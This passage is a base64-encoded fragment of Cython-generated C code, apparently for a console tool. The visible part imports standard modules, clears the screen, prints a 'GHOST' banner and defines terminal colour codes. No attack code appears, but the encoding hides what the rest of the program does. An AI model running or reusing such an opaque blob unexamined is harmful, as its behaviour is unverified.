fcHl4X25fdV93ZWJicm93c2VyLCAwLCAwLCBOVUxMLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMTEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF90XzIgPSBfX3B5eF90XzE7XG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3dlYmJyb3dzZXIsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuICBfX3B5eF90XzEgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlLCAwLCAwLCBOVUxMLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMTIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF90XzIgPSBfX3B5eF90XzE7XG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19weXhfdF8xID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oYXNobGliLCAwLCAwLCBOVUxMLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMTMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF90XzIgPSBfX3B5eF90XzE7XG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hhc2hsaWIsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxMywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuICBfX3B5eF90XzEgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSwgMCwgMCwgTlVMTCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDE0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfdF8yID0gX19weXhfdF8xO1xuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20sIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxNCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuICBfX3B5eF90XzEgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Jhc2U2NCwgMCwgMCwgTlVMTCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDE1LCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfdF8yID0gX19weXhfdF8xO1xuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYXNlNjQsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuICBfX3B5eF90XzEgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3V1aWQsIDAsIDAsIE5VTEwsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxNiwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X3RfMiA9IF9fcHl4X3RfMTtcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXVpZCwgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMSA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfanNvbiwgMCwgMCwgTlVMTCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDE3LCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfdF8yID0gX19weXhfdF8xO1xuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qc29uLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19weXhfdF8xID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aW1lLCAwLCAwLCBOVUxMLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMTgsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF90XzIgPSBfX3B5eF90XzE7XG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RpbWUsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxOCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuICB7XG4gICAgUHlPYmplY3QqIGNvbnN0IF9fcHl4X2ltcG9ydGVkX25hbWVzW10gPSB7X19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGV0aW1lfTtcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGV0aW1lLCBfX3B5eF9pbXBvcnRlZF9uYW1lcywgMSwgTlVMTCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDE5LCBfX3B5eF9MMV9lcnJvcilcbiAgfVxuICBfX3B5eF90XzIgPSBfX3B5eF90XzE7XG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICB7XG4gICAgUHlPYmplY3QqIGNvbnN0IF9fcHl4X2ltcG9ydGVkX25hbWVzW10gPSB7X19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGV0aW1lfTtcbiAgICBfX3B5eF90XzMgPSAwOyB7XG4gICAgICBfX3B5eF90XzQgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfMiwgX19weXhfaW1wb3J0ZWRfbmFtZXNbX19weXhfdF8zXSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE5LCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X2ltcG9ydGVkX25hbWVzW19fcHl4X3RfM10sIF9fcHl4X3RfNCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxOSwgX19weXhfTDFfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICB9XG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMSA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MsIDAsIDAsIE5VTEwsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAyMCwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X3RfMiA9IF9fcHl4X3RfMTtcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAyMCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuICBfX3B5eF90XzQgPSBOVUxMO1xuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMjEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAyMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgX19weXhfdF83ID0gMTtcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGVhcn07XG4gICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoKFB5T2JqZWN0KilfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNywgKDItX19weXhfdF83KSB8IChfX3B5eF90XzcqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDIxLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19weXhfdF82ID0gTlVMTDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZW5kZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICBfX3B5eF90XzUgPSBfX1B5eF9QeUxpc3RfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ3JlZW4pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAyMywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuXG4gIFxuICBfX3B5eF90XzcgPSAxO1xuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDQgOiAwKV0gPSB7X19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR0hPU1R9O1xuICAgIF9fcHl4X3RfOCA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoNCk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDIzLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9mb250LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmxvY2ssIF9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAyMywgX19weXhfTDFfZXJyb3IpXG4gICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29sb3JzLCBfX3B5eF90XzUsIF9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrMiwgMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAyMywgX19weXhfTDFfZXJyb3IpXG4gICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWxpZ24sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jZW50ZXIsIF9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrMiwgMikgPCAoMCkpIF9fUFlYX0VSUigwLCAyMywgX19weXhfTDFfZXJyb3IpXG4gICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3BhY2UsIFB5X1RydWUsIF9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrMiwgMykgPCAoMCkpIF9fUFlYX0VSUigwLCAyMywgX19weXhfTDFfZXJyb3IpXG4gICAgX19weXhfdF8yID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKChQeU9iamVjdCopX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzcsICgyLV9fcHl4X3RfNykgfCAoX19weXhfdF83Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfOCk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDIzLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgfVxuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2xvZ28sIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAyMywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuICBfX3B5eF90XzQgPSBOVUxMO1xuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2xvZ28pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAyNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICBfX3B5eF90XzcgPSAxO1xuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNCwgX19weXhfdF84fTtcbiAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKV9fcHl4X2J1aWx0aW5fcHJpbnQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNywgKDItX19weXhfdF83KSB8IChfX3B5eF90XzcqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDI1LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19weXhfdF84ID0gTlVMTDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aW1lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zbGVlcCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDI2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICBfX3B5eF90XzcgPSAxO1xuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzF9O1xuICAgIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzcsICgyLV9fcHl4X3RfNykgfCAoX19weXhfdF83Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAyNiwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMiA9IF9fUHl4X1B5M01ldGFjbGFzc1ByZXBhcmUoKFB5T2JqZWN0ICopIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQ29sb3JzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQ29sb3JzLCAoUHlPYmplY3QgKikgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3R0LCAoUHlPYmplY3QgKikgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDI5LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG5cbiAgXG4gIGlmIChfX1B5eF9TZXROYW1lSW5DbGFzcyhfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SRVNFVCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8wbSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzMCwgX19weXhfTDFfZXJyb3IpXG5cbiAgXG4gIGlmIChfX1B5eF9TZXROYW1lSW5DbGFzcyhfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9CT0xELCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzFtKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMxLCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgaWYgKF9fUHl4X1NldE5hbWVJbkNsYXNzKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1JFRCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV85MW0pIDwgKDApKSBfX1BZWF9FUlIoMCwgMzIsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICBpZiAoX19QeXhfU2V0TmFtZUluQ2xhc3MoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR1JFRU4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfOTJtKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMzLCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgaWYgKF9fUHl4X1NldE5hbWVJbkNsYXNzKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1lFTExPVywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV85M20pIDwgKDApKSBfX1BZWF9FUlIoMCwgMzQsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICBpZiAoX19QeXhfU2V0TmFtZUluQ2xhc3MoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQkxVRSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV85NG0pIDwgKDApKSBfX1BZWF9FUlIoMCwgMzUsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICBpZiAoX19QeXhfU2V0TmFtZUluQ2xhc3MoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfTUFHRU5UQSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV85NW0pIDwgKDApKSBfX1BZWF9FUlIoMCwgMzYsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICBpZiAoX19QeXhfU2V0TmFtZUluQ2xhc3MoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQ1lBTiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV85Nm0pIDwgKDApKSBfX1BZWF9FUlIoMCwgMzcsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICBpZiAoX19QeXhfU2V0TmFtZUluQ2xhc3MoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfV0hJVEUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfOTdtKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM4LCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgaWYgKF9fUHl4X1NldE5hbWVJbkNsYXNzKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X09SQU5HRSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8zOF81XzIwOG0pIDwgKDApKSBfX1BZWF9FUlIoMCwgMzksIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICBpZiAoX19QeXhfU2V0TmFtZUluQ2xhc3MoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfTElNRSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8zOF81XzExOG0pIDwgKDApKSBfX1BZWF9FUlIoMCwgNDAsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICBpZiAoX19QeXhfU2V0TmFtZUluQ2xhc3MoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUElOSywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8zOF81XzE5OG0pIDwgKDApKSBfX1BZWF9FUlIoMCwgNDEsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICBpZiAoX19QeXhfU2V0TmFtZUluQ2xhc3MoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUFVSUExFLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzM4XzVfOTNtKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQyLCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgX19weXhfdF81ID0gX19QeXhfUHkzQ2xhc3NDcmVhdGUoKChQeU9iamVjdCopJlB5VHlwZV9UeXBlKSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0NvbG9ycywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIF9fcHl4X3RfMiwgTlVMTCwgMCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDI5LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBFMDAwMFxuICBQeVVuc3RhYmxlX09iamVjdF9FbmFibGVEZWZlcnJlZFJlZmNvdW50KF9fcHl4X3RfNSk7XG4gICNlbmRpZlxuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0NvbG9ycywgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDI5LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuICBfX3B5eF90XzUgPSBOVUxMO1xuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl